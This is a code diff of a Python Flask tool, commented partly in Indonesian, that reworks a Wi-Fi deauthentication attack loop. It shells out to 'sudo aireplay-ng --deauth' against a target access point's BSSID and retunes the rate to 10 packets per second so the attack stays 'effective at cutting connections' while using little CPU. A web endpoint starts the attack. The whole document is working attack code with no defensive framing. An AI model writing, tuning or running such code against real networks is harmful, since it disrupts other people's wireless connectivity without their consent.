@@ -251,55 +251,77 @@ def stop_sniff_process():
         os.killpg(os.getpgid(attack_processes["sniff"].pid), signal.SIGTERM)
         attack_processes["sniff"] = None
 
-# ====================== DEAUTH SINGLE TARGET (DIOPTIMALKAN) ======================
+# ====================== DEAUTH OPTIMIZED - 10 PACKETS PER SECOND ======================
 
 def deauth_loop_single(target, interface):
     """
-    Loop deauth untuk satu target saja dengan optimasi:
-    - Burst packet yang lebih agresif
-    - Delay minimal antar paket
-    - Menggunakan channel target secara konsisten
+    Deauth loop optimized:
+    - 10 paket per detik (2 burst x 5 paket)
+    - Ringan di CPU VM
+    - Tetap efektif memutuskan koneksi
     """
     global deauth_running, current_target
     bssid = target['bssid']
     channel = target['channel']
     essid = target.get('essid', 'Unknown')
     
-    print(f"[*] Starting optimized deauth on {bssid} (CH {channel}) - {essid}")
+    print(f"[*] Starting deauth on {bssid} (CH {channel}) - {essid}")
+    print(f"[*] Rate: 10 packets/second (2 bursts x 5 packets)")
     
     # Set channel ke target
     set_channel(interface, channel)
     
-    # HITUNG TOTAL PAKET YANG DIKIRIM
+    # Statistik
     packet_count = 0
     attack_rounds = 0
+    start_time = time.time()
+    
+    # Konfigurasi: 10 paket/detik
+    BURST_SIZE = 5      # 5 paket per burst
+    BURSTS_PER_SECOND = 2  # 2 burst per detik = 10 paket/detik
     
     while deauth_running:
         attack_rounds += 1
         
-        # Kirim BURST deauth dengan jumlah paket yang banyak (100 paket)
-        # Ini lebih kuat karena langsung mengirim banyak paket sekaligus
-        cmd = f"sudo aireplay-ng --deauth 100 -a {bssid} {interface}"
-        
+        # Kirim burst 1
+        cmd1 = f"sudo aireplay-ng --deauth {BURST_SIZE} -a {bssid} {interface}"
         try:
-            # Jalankan dengan timeout singkat (1 detik) agar tidak blocking
-            proc = subprocess.run(cmd, shell=True, timeout=1, capture_output=True, text=True)
-            packet_count += 100
-            
-            # Log setiap 10 round
-            if attack_rounds % 10 == 0:
-                print(f"[*] Attack round {attack_rounds} | Total packets: {packet_count}")
-            
+            subprocess.run(cmd1, shell=True, timeout=1, capture_output=True, text=True)
+            packet_count += BURST_SIZE
         except subprocess.TimeoutExpired:
-            # Timeout expired tapi proses masih jalan, kita lanjutkan
             pass
         except Exception as e:
-            print(f"[-] Error in deauth: {e}")
+            print(f"[-] Error in deauth burst 1: {e}")
         
-        # Delay sangat minimal (0.1 detik) untuk efisiensi dan stabilitas
-        time.sleep(0.1)
+        # Cek apakah masih running
+        if not deauth_running:
+            break
+        
+        # Delay 0.5 detik (setengah detik)
+        time.sleep(0.5)
+        
+        # Kirim burst 2
+        cmd2 = f"sudo aireplay-ng --deauth {BURST_SIZE} -a {bssid} {interface}"
+        try:
+            subprocess.run(cmd2, shell=True, timeout=1, capture_output=True, text=True)
+            packet_count += BURST_SIZE
+        except subprocess.TimeoutExpired:
+            pass
+        except Exception as e:
+            print(f"[-] Error in deauth burst 2: {e}")
+        
+        # Delay 0.5 detik lagi (total 1 detik per cycle)
+        time.sleep(0.5)
+        
+        # Log setiap 10 cycle (10 detik)
+        if attack_rounds % 10 == 0:
+            elapsed = time.time() - start_time
+            avg_rate = packet_count / elapsed if elapsed > 0 else 0
+            print(f"[*] Cycle {attack_rounds} | Total packets: {packet_count} | Rate: {avg_rate:.1f} pkts/sec")
     
-    print(f"[*] Deauth stopped. Total packets sent: {packet_count}")
+    elapsed = time.time() - start_time
+    avg_rate = packet_count / elapsed if elapsed > 0 else 0
+    print(f"[*] Deauth stopped. Total: {packet_count} packets in {elapsed:.1f}s ({avg_rate:.1f} pkts/sec)")
 
 @app.route('/start_deauth', methods=['POST'])
 def start_deauth():
@@ -329,7 +351,7 @@ def start_deauth():
     
     return jsonify({
         "status": "success", 
-        "message": f"Deauth started on {target['bssid']} (CH {target['channel']})",
+        "message": f"Deauth started on {target['bssid']} (CH {target['channel']}) - 10 packets/sec",
         "target": target
     })
 
